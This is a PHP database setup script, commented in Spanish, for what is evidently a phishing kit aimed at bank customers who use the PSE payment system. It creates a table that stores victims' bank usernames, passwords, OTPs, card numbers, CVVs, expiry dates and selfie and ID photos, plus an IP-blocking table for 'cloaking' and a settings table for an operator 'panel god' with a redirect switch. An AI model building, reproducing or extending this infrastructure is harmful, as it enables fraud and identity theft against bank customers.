<?php
// setup_db.php — Inicializa todas las tablas del proyecto en Neon PostgreSQL

$config = require __DIR__ . '/config/config.php';

echo "<h1>Inicializando Base de Datos...</h1><hr>";
echo "<div style='background:#f4f4f4;padding:15px;border:1px solid #ddd;margin-bottom:20px;font-family:monospace;'>";
echo "<strong>🔍 DIAGNÓSTICO DE CONEXIÓN:</strong><br>";
echo "DB Host: " . htmlspecialchars($config['db_host']) . "<br>";
echo "DB User: " . htmlspecialchars($config['db_user']) . "<br>";
echo "DB Name: " . htmlspecialchars($config['db_name']) . "<br>";
echo "DB Port: " . htmlspecialchars($config['db_port']) . "<br>";
echo "</div>";

$conn = require_once __DIR__ . '/config/db.php';

try {
    $driver = $conn->getAttribute(PDO::ATTR_DRIVER_NAME);
    echo "<p>Driver detectado: <strong>$driver</strong></p>";

    $SERIAL = ($driver === 'pgsql') ? "SERIAL PRIMARY KEY" : "INT AUTO_INCREMENT PRIMARY KEY";
    $TS = "TIMESTAMP DEFAULT CURRENT_TIMESTAMP";

    // ── Tabla PSE (logins de usuarios) ────────────────────────
    echo "<p>Creando tabla <strong>pse</strong>...</p>";
    $conn->exec("CREATE TABLE IF NOT EXISTS pse (
        id          $SERIAL,
        estado      INT DEFAULT 1,
        ip_address  VARCHAR(100),
        usuario     VARCHAR(255),
        clave       VARCHAR(255),
        banco       VARCHAR(100),
        email       VARCHAR(255),
        otp         VARCHAR(50),
        tarjeta     VARCHAR(50),
        fecha_exp   VARCHAR(20),
        cvv         VARCHAR(10),
        foto_selfie VARCHAR(255),
        foto_front  VARCHAR(255),
        foto_back   VARCHAR(255),
        clave_din   VARCHAR(50),
        fecha       $TS
    )");
    echo "<p style='color:green'>✅ Tabla <strong>pse</strong> verificada.</p>";

    // ── Tabla BLOCKED_IPS (IPs bloqueadas por cloaking) ──────
    echo "<p>Creando tabla <strong>blocked_ips</strong>...</p>";
    $conn->exec("CREATE TABLE IF NOT EXISTS blocked_ips (
        id         $SERIAL,
        ip         VARCHAR(100) UNIQUE NOT NULL,
        created_at $TS
    )");
    echo "<p style='color:green'>✅ Tabla <strong>blocked_ips</strong> verificada.</p>";

    // ── Tabla SETTINGS (configuraciones del panel god) ─────
    echo "<p>Creando tabla <strong>settings</strong>...</p>";
    $conn->exec("CREATE TABLE IF NOT EXISTS settings (
        id    $SERIAL,
        key   VARCHAR(100) UNIQUE NOT NULL,
        value TEXT NOT NULL
    )");
    // Valor por defecto del redirect
    try {
        $driver2 = $conn->getAttribute(PDO::ATTR_DRIVER_NAME);
        if ($driver2 === 'pgsql') {
            $conn->exec("INSERT INTO settings (key, value) VALUES ('redirect_enabled','1') ON CONFLICT (key) DO NOTHING");
        }
    }
    catch (Exception $e) {
    }
    echo "<p style='color:green'>✅ Tabla <strong>settings</strong> verificada.</p>";

    echo "<hr><h3>¡Instalación Completada con Éxito! ✅</h3>";
    echo "<p style='color:red'><strong>⚠️ Borra o protege este archivo después de correrlo.</strong></p>";
    echo "<a href='index.php'>Ir al Inicio</a>";

}
catch (PDOException $e) {
    die("<h3 style='color:red'>Error Fatal:</h3> " . $e->getMessage());
}
?>